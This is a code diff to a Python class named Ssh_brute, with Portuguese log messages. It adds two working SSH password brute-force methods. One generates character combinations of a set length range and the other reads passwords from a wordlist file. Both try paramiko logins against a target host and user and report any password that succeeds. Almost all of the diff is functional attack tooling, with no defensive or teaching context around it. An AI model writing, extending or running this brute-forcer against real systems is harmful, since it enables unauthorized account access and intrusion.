@@ -12,7 +12,7 @@ class Ssh_brute:
         self.filebr=filebr
         self.key=key
 
-    def ssh_brute(hostname,user,minimo="",maximo="",char="",verbose=""):
+    def ssh_brute_char(hostname,user,minimo="",maximo="",char="",verbose=""):
         min = minimo
         max = maximo
         chrs = char
@@ -37,6 +37,38 @@ class Ssh_brute:
                         Debug.ERRO("[+]SSHException")
                         pass
                 else:
-                    pass
+                    passw = ''.join(xs)
+                    try:
+                        s = paramiko.SSHClient();
+                        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                        s.load_system_host_keys();
+                        s.connect(hostname=hostname, username=user, password=passw)
+                        Debug.AVISO("[+] Success! %s => %s" % (user, passw))
+                        break
+                    except socket.gaierror:
+                        Debug.ERRO("[+]HOST INVALIDO")
+                        break
+                    except paramiko.AuthenticationException:
+                        Debug.ERRO("[-] falha:%s => %s" % (user, passw))
+                    except paramiko.ssh_exception.SSHException:
+                        Debug.ERRO("[+]SSHException")
+                        pass
 
-Ssh_brute.ssh_brute("localhost","brainiac",2,3,"dsa",True)
+    def ssh_brute_file(hostname,user,filebr):
+        with open(filebr,"r") as fl:
+            for passw in fl:
+                try:
+                    s = paramiko.SSHClient();
+                    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    s.load_system_host_keys();
+                    s.connect(hostname=hostname, username=user, password=passw)
+                    Debug.AVISO("[+] Success! %s => %s" % (user, passw))
+                    break
+                except socket.gaierror:
+                    Debug.ERRO("[+]HOST INVALIDO")
+                    break
+                except paramiko.AuthenticationException:
+                    Debug.ERRO("[-] falha:%s => %s" % (user, passw))
+                except paramiko.ssh_exception.SSHException:
+                    Debug.ERRO("[+]SSHException")
+                    pass
